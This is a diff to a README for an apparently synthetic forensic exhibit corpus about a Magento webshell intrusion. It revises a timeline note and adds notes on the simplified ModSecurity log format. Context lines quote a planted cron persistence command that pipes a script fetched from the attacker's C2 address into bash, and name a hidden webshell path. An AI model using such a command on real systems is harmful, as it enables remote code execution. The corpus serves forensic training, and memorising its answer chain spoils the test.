@@ -33,7 +33,7 @@ Correlation chain (resolved only cross-stream):
 1. `modsec_audit.log` transactions 280-291: POST to `/admin/sources/system/config/`
    from `203.0.113.42` at 2026-03-22T14:06-14:11Z (deserialization probe)
 2. `fs.mtime.txt`: `/var/www/html/pub/media/catalog/product/.cache/a.php`
-   mtime=2026-03-21T23:58:14Z (webshell staged immediately after modsec cluster)
+   mtime=2026-03-21T23:58:14Z (webshell staged ~14h before the in-corpus modsec cluster — initial-RCE event is offstage; see "Synthesis format notes" below)
 3. `apache.access.log`: attacker GET/POST traffic to the `.cache/a.php` path
    from the same C2 IP
 4. `cron.snapshot`: user `magento` cron entry — `curl -s http://203.0.113.42/c.txt|bash`
@@ -64,6 +64,12 @@ scripts/dev/synth-corpus.sh --seed 42 --out exhibits/fleet-01/large-corpus
 ```
 
 Output is byte-deterministic — same seed produces the same bundle.
+
+## Synthesis format notes
+
+- **ModSec Section A** uses the simplified shape `[ISO-8601] [client IP] hostname ModSecurity-Audit` — the synthesizer does not generate `mod_unique_id` values. Transfer-log join falls back to `(client_ip, timestamp, request_line)`. See `skills/linux-forensics/modsec-audit-format.md` §"Simplified Section A" for parser guidance.
+- **Section C** (request body) is omitted from POST transactions — the synthesis does not model `SecRequestBodyAccess On` deployments. POST payloads are visible in the access log only.
+- **Webshell staging** (`.cache/a.php` mtime at `2026-03-21T23:58:14Z`) precedes the in-corpus modsec dispatch cluster (`2026-03-22T12:00Z+`) by ~14 hours. The corpus models post-drop dispatch traffic; the initial-RCE event that planted `a.php` is out of capture window — a realistic hosting-stack scenario where forensic capture begins after the operator notices anomalous traffic, not at compromise time. The temporal gap between mtime and visible attack traffic is a forensic signal: a curator surfacing it correctly identifies that the initial-access vector is offstage and recommends pulling earlier log windows or sibling-host evidence.
 
 ## Sources
 
